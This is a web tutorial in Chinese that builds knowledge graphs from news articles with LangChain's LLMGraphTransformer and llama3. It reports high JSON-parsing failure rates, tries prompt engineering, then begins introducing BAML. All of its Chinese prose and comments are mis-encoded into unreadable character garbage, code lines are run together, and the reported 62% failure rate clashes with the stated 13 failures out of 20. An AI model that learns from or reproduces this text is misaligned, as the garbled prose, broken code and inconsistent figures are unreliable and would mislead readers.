<p>æˆ‘ä»¬è¿˜éœ€è¦å‘Šè¯‰è½¬æ¢å™¨æˆ‘ä»¬å¸Œæœ›ä¸ºèŠ‚ç‚¹å’Œå…³ç³»æå–å“ªäº›é¢å¤–ä¿¡æ¯æˆ–â€œå±æ€§â€ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªè¦æ±‚æè¿°ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä½¿ç”¨llama3æ¨¡å‹åˆå§‹åŒ–LLMGraphTransformer  </span>
<span class="hljs-comment"># æŒ‡å®šæˆ‘ä»¬å¸Œæœ›èŠ‚ç‚¹å’Œå…³ç³»éƒ½æœ‰'description'å±æ€§  </span>
<span class="hljs-attr">llm_transformer</span> = LLMGraphTransformer(  
Â  Â  <span class="hljs-attr">llm</span>=llm,  
Â  Â  <span class="hljs-attr">node_properties</span>=[<span class="hljs-string">"description"</span>],  
Â  Â  <span class="hljs-attr">relationship_properties</span>=[<span class="hljs-string">"description"</span>]  
)
</code></pre>
<p>ä¸ºäº†è®©æµç¨‹å¯é‡å¤ä¸”æ•´æ´ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„è¾…åŠ©å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å°†æ¥å—ä¸€ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²ï¼Œå°†å…¶åŒ…è£…æˆLangChainçš„Documentæ ¼å¼ï¼Œç„¶åä¼ é€’ç»™llm_transformerä»¥è·å–å›¾è°±ç»“æ„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¼å…¥Listç±»å‹ç”¨äºç±»å‹æç¤º  </span>
<span class="hljs-keyword">from</span>Â typingÂ <span class="hljs-keyword">import</span>Â <span class="hljs-type">List</span>  
  
<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå¤„ç†å•ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²å¹¶å°†å…¶è½¬æ¢ä¸ºå›¾è°±æ–‡æ¡£  </span>
<span class="hljs-keyword">def</span>Â <span class="hljs-title function_">process_text</span>(<span class="hljs-params">text:Â <span class="hljs-built_in">str</span></span>) -&gt;Â <span class="hljs-type">List</span>[GraphDocument]:  
Â  Â Â <span class="hljs-comment"># ä»åŸå§‹æ–‡æœ¬åˆ›å»ºLangChain Documentå¯¹è±¡  </span>
Â  Â  doc = Document(page_content=text)  
Â  Â Â <span class="hljs-comment"># ä½¿ç”¨è½¬æ¢å™¨å°†æ–‡æ¡£è½¬æ¢ä¸ºå›¾è°±æ–‡æ¡£åˆ—è¡¨  </span>
Â  Â Â <span class="hljs-keyword">return</span>Â llm_transformer.convert_to_graph_documents([doc])
</code></pre>
<p>ä¸€åˆ‡è®¾ç½®å¥½åï¼Œæ˜¯æ—¶å€™è¿è¡Œå®éªŒäº†ã€‚ä¸ºäº†ä¿æŒå¯ç®¡ç†æ€§å¹¶çªå‡ºæ ¸å¿ƒé—®é¢˜ï¼Œæˆ‘ä»¬å°†å¤„ç†æ•°æ®é›†ä¸­çš„20ç¯‡æ–‡ç« æ ·æœ¬ã€‚</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨ThreadPoolExecutorå¹¶è¡Œè¿è¡Œå¤„ç†ï¼Œä»¥åŠ å¿«å·¥ä½œæµç¨‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥å¹¶å‘å¤„ç†å’Œè¿›åº¦æ¡çš„åº“  </span>
fromÂ concurrent.futuresÂ importÂ ThreadPoolExecutor, as_completed  
fromÂ tqdmÂ importÂ tqdm  
  
<span class="hljs-comment"># è®¾ç½®å¹¶è¡Œå·¥ä½œè€…çš„æ•°é‡å’Œè¦å¤„ç†çš„æ–‡ç« æ•°é‡  </span>
<span class="hljs-attr">MAX_WORKERS</span> =Â <span class="hljs-number">10</span>  
<span class="hljs-attr">NUM_ARTICLES</span> =Â <span class="hljs-number">20</span>  
  
<span class="hljs-comment"># è¿™ä¸ªåˆ—è¡¨å°†å­˜å‚¨ç”Ÿæˆçš„å›¾è°±æ–‡æ¡£  </span>
<span class="hljs-attr">graph_documents</span> = []  
  
<span class="hljs-comment"># ä½¿ç”¨ThreadPoolExecutorå¹¶è¡Œå¤„ç†æ–‡ç«   </span>
withÂ ThreadPoolExecutor(<span class="hljs-attr">max_workers</span>=MAX_WORKERS)Â asÂ executor:  
Â  Â Â <span class="hljs-comment"># ä¸ºæ ·æœ¬ä¸­çš„æ¯ç¯‡æ–‡ç« æäº¤å¤„ç†ä»»åŠ¡  </span>
Â  Â  <span class="hljs-attr">futures</span> = [  
Â  Â  Â  Â  executor.submit(process_text,Â f<span class="hljs-string">"{row['title']}Â {row['text']}"</span>)  
Â  Â  Â  Â Â forÂ i, rowÂ inÂ news.head(NUM_ARTICLES).iterrows()  
Â  Â  ]  
  
Â  Â Â <span class="hljs-comment"># æ¯å½“ä»»åŠ¡å®Œæˆæ—¶ï¼Œè·å–ç»“æœå¹¶æ·»åŠ åˆ°åˆ—è¡¨ä¸­  </span>
Â  Â Â forÂ futureÂ inÂ tqdm(  
Â  Â  Â  Â  as_completed(futures), <span class="hljs-attr">total</span>=len(futures), desc=<span class="hljs-string">"å¤„ç†æ–‡æ¡£"</span>  
Â  Â  ):  
Â  Â  Â  Â  <span class="hljs-attr">graph_document</span> = future.result()  
Â  Â  Â  Â  graph_documents.extend(graph_document)
</code></pre>
<p>è¿è¡Œä»£ç åï¼Œè¿›åº¦æ¡æ˜¾ç¤ºæ‰€æœ‰20ç¯‡æ–‡ç« éƒ½å·²å¤„ç†ã€‚</p>
<h4 data-id="heading-6">è¾“å‡º</h4>
<pre><code class="hljs language-bash" lang="bash">å¤„ç†æ–‡æ¡£: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 20/20 [01:32&lt;00:00,  4.64s/it]
</code></pre>
<hr/>
<h2 data-id="heading-7">ç†è§£LangChainçš„é—®é¢˜</h2>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä»€ä¹ˆï¼Ÿè®©æˆ‘ä»¬æ£€æŸ¥graph_documentsåˆ—è¡¨ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"># æ˜¾ç¤ºå›¾è°±æ–‡æ¡£åˆ—è¡¨<span class="hljs-built_in">print</span>(graph_documents)
</code></pre>
<p>è¿™æ˜¯æˆ‘ä»¬å¾—åˆ°çš„è¾“å‡ºï¼š</p>
<h4 data-id="heading-8">è¾“å‡º</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[GraphDocument(nodes=[]</span>, <span class="hljs-attr">relationships</span>=[], source=Document(metadata={}, page_content=<span class="hljs-string">'XPeng Stock Rises...'</span>)),  
Â GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'Ryanair sacks chief pilot...'</span>)),  
Â GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'DÃ¡il almost suspended...'</span>)),  
Â GraphDocument(<span class="hljs-attr">nodes</span>=[Node(id=<span class="hljs-string">'Jude Bellingham'</span>,Â type=<span class="hljs-string">'Person'</span>, properties={}), Node(id=<span class="hljs-string">'Real Madrid'</span>,Â type=<span class="hljs-string">'Organization'</span>, properties={})], relationships=[], source=Document(metadata={}, page_content=<span class="hljs-string">'Arsenal have Rice bid rejected...'</span>)),  
Â ...  
]
</code></pre>
<p>ç«‹åˆ»å°±èƒ½çœ‹å‡ºé—®é¢˜ã€‚è®¸å¤šGraphDocumentå¯¹è±¡çš„èŠ‚ç‚¹å’Œå…³ç³»åˆ—è¡¨æ˜¯ç©ºçš„ã€‚</p>
<p>è¿™æ„å‘³ç€å¯¹äºè¿™äº›æ–‡ç« ï¼ŒLLMè¦ä¹ˆç”Ÿæˆäº†LangChainæ— æ³•è§£ææˆæœ‰æ•ˆå›¾è°±ç»“æ„çš„è¾“å‡ºï¼Œè¦ä¹ˆå®Œå…¨æ— æ³•æå–ä»»ä½•å®ä½“ã€‚</p>
<p>è¿™å°±æ˜¯ä½¿ç”¨è¾ƒå°çš„é‡åŒ–LLMè¿›è¡Œç»“æ„åŒ–æ•°æ®æå–çš„æ ¸å¿ƒæŒ‘æˆ˜ã€‚å®ƒä»¬å¾€å¾€éš¾ä»¥éµå¾ªåƒLLMGraphTransformerè¿™æ ·çš„å·¥å…·æ‰€æœŸæœ›çš„ä¸¥æ ¼JSONæ ¼å¼ã€‚å¦‚æœæœ‰ä¸€ä¸ªå°å°çš„é”™è¯¯â€”â€”æ¯”å¦‚å¤šä½™çš„é€—å·ã€ç¼ºå°‘å¼•å·â€”â€”è§£æå°±ä¼šå¤±è´¥ï¼Œæˆ‘ä»¬ä»€ä¹ˆä¹Ÿå¾—ä¸åˆ°ã€‚</p>
<p>è®©æˆ‘ä»¬é‡åŒ–è¿™ä¸ªå¤±è´¥ç‡ã€‚æˆ‘ä»¬å°†ç»Ÿè®¡20ç¯‡æ–‡æ¡£ä¸­æœ‰å¤šå°‘ç¯‡ç”Ÿæˆäº†ç©ºçš„å›¾è°±ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºç»Ÿè®¡æ²¡æœ‰èŠ‚ç‚¹çš„æ–‡æ¡£  </span>
<span class="hljs-attr">empty_count</span> =Â <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># éå†ç”Ÿæˆçš„å›¾è°±æ–‡æ¡£  </span>
forÂ docÂ inÂ graph_documents:  
Â  Â Â <span class="hljs-comment"># å¦‚æœ'nodes'åˆ—è¡¨ä¸ºç©ºï¼Œè®¡æ•°å™¨åŠ 1  </span>
Â  Â Â ifÂ notÂ doc.nodes:  
Â  Â  Â  Â  empty_count +=Â 1
</code></pre>
<p>ç°åœ¨ï¼Œè®¡ç®—å¤±è´¥çš„ç™¾åˆ†æ¯”ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è®¡ç®—å¹¶æ‰“å°å¤±è´¥ç”ŸæˆèŠ‚ç‚¹çš„æ–‡æ¡£ç™¾åˆ†æ¯”  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing:Â <span class="hljs-subst">{empty_count/<span class="hljs-built_in">len</span>(graph_documents)*<span class="hljs-number">100</span>}</span>"</span>)
</code></pre>
<h4 data-id="heading-9">è¾“å‡º</h4>
<pre><code class="hljs language-r" lang="r">Percentage <span class="hljs-built_in">missing</span><span class="hljs-operator">:</span> <span class="hljs-number">75.0</span>
</code></pre>
<p>75%çš„å¤±è´¥ç‡ã€‚è¿™å¤ªç³Ÿç³•äº†ã€‚è¿™æ„å‘³ç€åœ¨æˆ‘ä»¬çš„20ç¯‡æ–‡ç« æ ·æœ¬ä¸­ï¼Œåªæœ‰5ç¯‡æˆåŠŸè½¬æ¢æˆäº†çŸ¥è¯†å›¾è°±ã€‚</p>
<p>25%çš„æˆåŠŸç‡å¯¹äºä»»ä½•ç”Ÿäº§ç³»ç»Ÿæ¥è¯´éƒ½æ˜¯ä¸å¯æ¥å—çš„ã€‚</p>
<p>è¿™å°±æ˜¯é—®é¢˜çš„æ‰€åœ¨ï¼Œè€Œä¸”è¿™æ˜¯ä¸€ä¸ªå¸¸è§é—®é¢˜ã€‚æ ‡å‡†æ–¹æ³•å¯¹äºè¾ƒå°LLMç•¥æ˜¾ä¸å¯é¢„æµ‹çš„ç‰¹æ€§æ¥è¯´è¿‡äºä¸¥æ ¼ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ”¹è¿›æç¤ºèƒ½è§£å†³é—®é¢˜å—ï¼Ÿ</h2>
<p>75%çš„å¤±è´¥ç‡æ˜¯ä¸ªå¤§é—®é¢˜ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œå½“LLMè¡¨ç°ä¸ä½³æ—¶ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ååº”å¾€å¾€æ˜¯è°ƒæ•´æç¤ºã€‚æ›´å¥½çš„æŒ‡ä»¤åº”è¯¥å¸¦æ¥æ›´å¥½çš„ç»“æœï¼Œå¯¹å§ï¼ŸLLMGraphTransformerå†…éƒ¨ä½¿ç”¨é»˜è®¤æç¤ºï¼Œä½†æˆ‘ä»¬æ— æ³•è½»æ˜“ä¿®æ”¹å®ƒã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ç”¨LangChainçš„ChatPromptTemplateæ„å»ºè‡ªå·±çš„ç®€å•é“¾ã€‚è¿™è®©æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶å‘é€ç»™llama3çš„æŒ‡ä»¤ã€‚æˆ‘ä»¬å¯ä»¥æ›´æ˜ç¡®åœ°â€œå¼•å¯¼â€æ¨¡å‹æ¯æ¬¡ç”Ÿæˆæ­£ç¡®çš„JSONæ ¼å¼ã€‚</p>
<p>æˆ‘ä»¬å…ˆç”¨Pydanticæ¨¡å‹å®šä¹‰æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºç»“æ„ã€‚è¿™æ˜¯LangChainä¸­ç»“æ„åŒ–è¾“å‡ºçš„å¸¸è§æ¨¡å¼ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥Pydanticæ¨¡å‹ä»¥å®šä¹‰æ•°æ®ç»“æ„  </span>
fromÂ langchain_core.pydantic_v1Â importÂ BaseModel, Field  
  
<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªç®€å•çš„èŠ‚ç‚¹ç»“æ„  </span>
classNode(BaseModel):  
Â  Â Â id:Â <span class="hljs-attr">str</span>Â = Field(description=<span class="hljs-string">"èŠ‚ç‚¹çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚"</span>)  
Â  Â Â type:Â <span class="hljs-attr">str</span>Â = Field(description=<span class="hljs-string">"èŠ‚ç‚¹ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒPerson, Organizationï¼‰ã€‚"</span>)  
  
<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªç®€å•çš„å…³ç³»ç»“æ„  </span>
classRelationship(BaseModel):  
Â  Â  source: <span class="hljs-attr">Node</span> = Field(description=<span class="hljs-string">"å…³ç³»çš„æºèŠ‚ç‚¹ã€‚"</span>)  
Â  Â  target: <span class="hljs-attr">Node</span> = Field(description=<span class="hljs-string">"å…³ç³»çš„ç›®æ ‡èŠ‚ç‚¹ã€‚"</span>)  
Â  Â Â type:Â <span class="hljs-attr">str</span>Â = Field(description=<span class="hljs-string">"å…³ç³»ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒWORKS_FORï¼‰ã€‚"</span>)  
  
<span class="hljs-comment"># å®šä¹‰æ•´ä½“å›¾è°±ç»“æ„  </span>
classKnowledgeGraph(BaseModel):  
Â  Â  nodes:Â List<span class="hljs-section">[Node]</span> = Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"å›¾è°±ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨ã€‚"</span>)  
Â  Â  relationships:Â List<span class="hljs-section">[Relationship]</span> = Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"å›¾è°±ä¸­çš„å…³ç³»åˆ—è¡¨ã€‚"</span>)
</code></pre>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ›´è¯¦ç»†çš„æç¤ºã€‚è¿™ä¸ªæç¤ºå°†æ˜ç¡®åŒ…å«ä»Pydanticæ¨¡å‹ç”Ÿæˆçš„JSON schemaï¼Œå¹¶ç»™LLMéå¸¸å…·ä½“çš„æŒ‡ä»¤ã€‚</p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°½é‡å‡å°‘é”™è¯¯ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥æç¤ºæ¨¡æ¿å’Œè¾“å‡ºè§£æå™¨  </span>
fromÂ langchain_core.promptsÂ importÂ ChatPromptTemplate  
fromÂ langchain_core.output_parsers.jsonÂ importÂ JsonOutputParser  
  
<span class="hljs-comment"># åˆ›å»ºæˆ‘ä»¬æœŸæœ›è¾“å‡ºç»“æ„çš„å®ä¾‹  </span>
<span class="hljs-attr">parser</span> = JsonOutputParser(pydantic_object=KnowledgeGraph)  
  
<span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¯¦ç»†çš„æç¤ºæ¨¡æ¿ï¼ŒåŒ…å«æ˜ç¡®æŒ‡ä»¤  </span>
<span class="hljs-attr">template</span> =Â <span class="hljs-string">"""  
ä½ æ˜¯ä¸€ä¸ªé¡¶çº§ç®—æ³•ï¼Œæ“…é•¿ä»¥ç»“æ„åŒ–æ ¼å¼æå–ä¿¡æ¯ã€‚  
ä»ç»™å®šçš„è¾“å…¥æ–‡æœ¬ä¸­æå–çŸ¥è¯†å›¾è°±ï¼ŒåŒ…æ‹¬èŠ‚ç‚¹å’Œå…³ç³»ã€‚  
ä½ çš„ç›®æ ‡æ˜¯å°½å¯èƒ½å…¨é¢ï¼Œæå–æ‰€æœ‰ç›¸å…³å®ä½“åŠå…¶è¿æ¥ã€‚  
  
å°†è¾“å‡ºæ ¼å¼åŒ–ä¸ºå¸¦æœ‰'nodes'å’Œ'relationships'é”®çš„JSONå¯¹è±¡ã€‚  
ä¸¥æ ¼éµå¾ªä»¥ä¸‹JSON schemaï¼š  
{schema}  
  
ä»¥ä¸‹æ˜¯è¾“å…¥æ–‡æœ¬ï¼š  
--------------------  
{text}  
--------------------  
"""</span>  
  
<span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_template(  
Â  Â  template,  
Â  Â  <span class="hljs-attr">partial_variables</span>={<span class="hljs-string">"schema"</span>: parser.get_format_instructions()},  
)  
  
<span class="hljs-comment"># åˆ›å»ºå®Œæ•´çš„æå–é“¾  </span>
<span class="hljs-attr">chain</span> = prompt | llm | parser
</code></pre>
<p>è¿™ä¸ªæ–°é“¾æ¯”LLMGraphTransformeræ›´æ˜ç¡®ã€‚æˆ‘ä»¬ç»™æ¨¡å‹æä¾›äº†è¯¦ç»†çš„schemaå’Œæ¸…æ™°çš„æŒ‡ä»¤ã€‚è®©æˆ‘ä»¬å†æ¬¡è¿è¡Œ20ç¯‡æ–‡ç« æ ·æœ¬ï¼Œçœ‹çœ‹æˆåŠŸç‡æ˜¯å¦æœ‰æ‰€æé«˜ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¿™ä¸ªåˆ—è¡¨å°†å­˜å‚¨æ–°ç»“æœ  </span>
<span class="hljs-attr">graph_documents_prompt_engineered</span> = []  
<span class="hljs-attr">errors</span> = []  
  
forÂ i, rowÂ inÂ tqdm(news.head(NUM_ARTICLES).iterrows(), <span class="hljs-attr">total</span>=NUM_ARTICLES, desc=<span class="hljs-string">"ä½¿ç”¨æ”¹è¿›æç¤ºå¤„ç†"</span>):  
Â  Â  <span class="hljs-attr">text</span> =Â f<span class="hljs-string">"{row['title']}Â {row['text']}"</span>  
Â  Â Â try:  
Â  Â  Â  Â Â <span class="hljs-comment"># è°ƒç”¨æˆ‘ä»¬æ”¹è¿›çš„æ–°é“¾  </span>
Â  Â  Â  Â  <span class="hljs-attr">graph_data</span> = chain.invoke({<span class="hljs-string">"text"</span>: text})  
Â  Â  Â  Â Â   
Â  Â  Â  Â Â <span class="hljs-comment"># æ‰‹åŠ¨å°†è§£æçš„JSONè½¬æ¢å›GraphDocumentæ ¼å¼  </span>
Â  Â  Â  Â  <span class="hljs-attr">nodes</span> = [Node(id=node[<span class="hljs-string">'id'</span>],Â type=node[<span class="hljs-string">'type'</span>])Â forÂ nodeÂ inÂ graph_data.get(<span class="hljs-string">'nodes'</span>, [])]  
Â  Â  Â  Â  <span class="hljs-attr">relationships</span> = [Relationship(source=Node(id=rel[<span class="hljs-string">'source'</span>][<span class="hljs-string">'id'</span>],Â type=rel[<span class="hljs-string">'source'</span>][<span class="hljs-string">'type'</span>]),  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  target=Node(id=rel[<span class="hljs-string">'target'</span>][<span class="hljs-string">'id'</span>],Â type=rel[<span class="hljs-string">'target'</span>][<span class="hljs-string">'type'</span>]),  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â type=rel[<span class="hljs-string">'type'</span>])Â forÂ relÂ inÂ graph_data.get(<span class="hljs-string">'relationships'</span>, [])]  
Â  Â  Â  Â Â   
Â  Â  Â  Â  <span class="hljs-attr">doc</span> = Document(page_content=text)  
Â  Â  Â  Â  graph_documents_prompt_engineered.append(GraphDocument(<span class="hljs-attr">nodes</span>=nodes, relationships=relationships, source=doc))  
Â  Â  Â  Â Â   
Â  Â Â exceptÂ ExceptionÂ asÂ e:  
Â  Â  Â  Â Â <span class="hljs-comment"># å¦‚æœLLMè¾“å‡ºä¸æ˜¯æœ‰æ•ˆçš„JSONï¼Œè§£æå™¨ä¼šå¤±è´¥ã€‚æˆ‘ä»¬æ•è·è¿™ä¸ªé”™è¯¯ã€‚  </span>
Â  Â  Â  Â  errors.append(str(e))  
Â  Â  Â  Â  <span class="hljs-attr">doc</span> = Document(page_content=text)  
Â  Â  Â  Â  graph_documents_prompt_engineered.append(GraphDocument(<span class="hljs-attr">nodes</span>=[], relationships=[], source=doc))
</code></pre>
<p>ç°åœ¨æ˜¯å…³é”®æ—¶åˆ»ã€‚è®©æˆ‘ä»¬å†æ¬¡æ£€æŸ¥å¤±è´¥ç‡ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºç»Ÿè®¡æ²¡æœ‰èŠ‚ç‚¹çš„æ–‡æ¡£  </span>
empty_count_prompt_engineered =Â <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># éå†æ–°ç»“æœ  </span>
<span class="hljs-keyword">for</span>Â docÂ <span class="hljs-keyword">in</span>Â graph_documents_prompt_engineered:  
Â  Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-keyword">not</span>Â doc.nodes:  
Â  Â  Â  Â  empty_count_prompt_engineered +=Â <span class="hljs-number">1</span>  
  
<span class="hljs-comment"># è®¡ç®—å¹¶æ‰“å°æ–°çš„å¤±è´¥ç™¾åˆ†æ¯”  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing with improved prompt:Â <span class="hljs-subst">{empty_count_prompt_engineered /Â <span class="hljs-built_in">len</span>(graph_documents_prompt_engineered) *Â <span class="hljs-number">100</span>}</span>%"</span>)  
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Number of JSON parsing errors:Â <span class="hljs-subst">{<span class="hljs-built_in">len</span>(errors)}</span>"</span>)
</code></pre>
<h4 data-id="heading-11">è¾“å‡º</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Percentage</span> missing <span class="hljs-keyword">with</span> improved <span class="hljs-attr">prompt</span>: <span class="hljs-number">62.0</span>%  
<span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> <span class="hljs-title class_">JSON</span> parsing <span class="hljs-attr">errors</span>: <span class="hljs-number">13</span>
</code></pre>
<p>ç»“æœå‘¢ï¼Ÿå¤±è´¥ç‡çº¦ä¸º62%ã€‚è™½ç„¶æ¯”æœ€åˆçš„75%ç•¥æœ‰æ”¹è¿›ï¼Œä½†ä»è¿œä¸å¤Ÿå¯é ã€‚æˆ‘ä»¬ä»ç„¶æ— æ³•ä»20ç¯‡æ–‡ç« ä¸­çš„13ç¯‡æå–å›¾è°±ã€‚JsonOutputParseræ¯æ¬¡éƒ½æŠ›å‡ºé”™è¯¯ï¼Œå› ä¸ºå°½ç®¡æˆ‘ä»¬å°½åŠ›ä¼˜åŒ–äº†æç¤ºï¼Œllama3ä»ç„¶ç”Ÿæˆäº†æ ¼å¼é”™è¯¯çš„JSONã€‚</p>
<p>è¿™è¡¨æ˜äº†ä¸€ä¸ªæ ¹æœ¬æ€§é™åˆ¶ï¼š</p>
<p>ä»…é æç¤ºå·¥ç¨‹æ— æ³•å®Œå…¨è§£å†³è¾ƒå°LLMç”Ÿæˆä¸ä¸€è‡´ç»“æ„åŒ–è¾“å‡ºçš„é—®é¢˜ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚æœæ›´å¥½çš„æç¤ºä¸æ˜¯ç­”æ¡ˆï¼Œé‚£æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·¥å…·ï¼Œä¸ä»…è¦æ±‚å¥½çš„è¾“å‡ºï¼Œè¿˜èƒ½èªæ˜åœ°å¤„ç†LLMç»™å‡ºçš„ä¸å®Œç¾è¾“å‡ºã€‚è¿™æ­£æ˜¯BAMLè®¾è®¡æ¥è§£å†³çš„é—®é¢˜ã€‚</p>
<p>åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†ç”¨BAMLé©±åŠ¨çš„å®ç°æ›¿æ¢æ•´ä¸ªé“¾ï¼Œçœ‹çœ‹å®ƒå¸¦æ¥çš„å˜åŒ–ã€‚</p>
<hr/>
<h2 data-id="heading-12">BAMLçš„åˆå§‹åŒ–å’Œå¿«é€Ÿæ¦‚è§ˆ</h2>
<p>æˆ‘ä»¬å·²ç»ç¡®å®šï¼Œå³ä½¿å°å¿ƒè¿›è¡Œæç¤ºå·¥ç¨‹ï¼Œä¾èµ–ä¸¥æ ¼çš„JSONè§£æä¸è¾ƒå°çš„LLMä¸€èµ·ä½¿ç”¨æ˜¯å¤±è´¥çš„ç§˜è¯€ã€‚æ¨¡å‹å¾ˆå¼ºå¤§ï¼Œä½†ä¸æ˜¯å®Œç¾çš„æ ¼å¼åŒ–å·¥å…·ã€‚</p>
<p>è¿™æ­£æ˜¯BAMLï¼ˆBasically, A Made-up Languageï¼‰éå¸¸é‡è¦çš„åœ°æ–¹ã€‚BAMLæä¾›äº†ä¸¤ä¸ªå…³é”®ä¼˜åŠ¿ï¼Œç›´æ¥è§£å†³äº†æˆ‘ä»¬çš„é—®é¢˜ï¼š</p>
<ul>
<li>â€¢Â <strong>ç®€åŒ–çš„Schema</strong>ï¼šBAMLä¸ç”¨å†—é•¿çš„JSON schemaï¼Œè€Œæ˜¯ä½¿ç”¨ç±»ä¼¼TypeScriptçš„ç®€æ´è¯­æ³•å®šä¹‰æ•°æ®ç»“æ„ã€‚è¿™å¯¹äººç±»å’ŒLLMéƒ½æ›´å®¹æ˜“ç†è§£ï¼Œå‡å°‘tokenä½¿ç”¨å’Œæ··æ·†çš„å¯èƒ½æ€§ã€‚</li>
<li>â€¢Â <strong>é²æ£’çš„è§£æ</strong>ï¼šBAMLçš„å®¢æˆ·ç«¯å¸¦æœ‰â€œæ¨¡ç³Šâ€æˆ–â€œschemaå¯¹é½â€çš„è§£æå™¨ã€‚å®ƒä¸æœŸæœ›å®Œç¾çš„JSONï¼Œèƒ½å¤„ç†LLMå¸¸è§çš„é”™è¯¯ï¼Œå¦‚å¤šä½™çš„é€—å·ã€ç¼ºå°‘å¼•å·æˆ–å¤šä½™æ–‡æœ¬ï¼Œä»ç„¶æˆåŠŸæå–æ•°æ®ã€‚</li>
</ul>
<p>é¦–å…ˆï¼Œä½ éœ€è¦å®‰è£…BAMLå®¢æˆ·ç«¯å’Œå®ƒçš„VS Codeæ‰©å±•ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…BAMLå®¢æˆ·ç«¯  </span>
pip install baml-py
</code></pre>
<p>åœ¨VS Codeå¸‚åœºä¸­æœç´¢BAMLå¹¶å®‰è£…æ‰©å±•ã€‚è¿™ä¸ªæ‰©å±•å¾ˆæ£’ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ä¸ªäº¤äº’å¼æ¸¸ä¹åœºï¼Œè®©ä½ æ— éœ€æ¯æ¬¡è¿è¡ŒPythonä»£ç å³å¯æµ‹è¯•æç¤ºå’Œschemaã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ä¸€ä¸ª.bamlæ–‡ä»¶ä¸­å®šä¹‰å›¾è°±æå–é€»è¾‘ã€‚å°†å…¶è§†ä¸ºLLMè°ƒç”¨çš„é…ç½®æ–‡ä»¶ã€‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º<code>extract_graph.baml</code>çš„æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å®šä¹‰å›¾è°±ä¸­çš„èŠ‚ç‚¹ï¼ŒåŒ…å«IDã€ç±»å‹å’Œå¯é€‰å±æ€§  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">SimpleNode</span> {  
Â  id <span class="hljs-built_in">string</span> Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// èŠ‚ç‚¹çš„å”¯ä¸€æ ‡è¯†ç¬¦  </span>
Â  type <span class="hljs-built_in">string</span> Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment">// èŠ‚ç‚¹çš„ç±»å‹/ç±»åˆ«  </span>
Â  properties Properties Â  Â  Â <span class="hljs-comment">// ä¸èŠ‚ç‚¹ç›¸å…³çš„é™„åŠ å±æ€§  </span>
}  
  
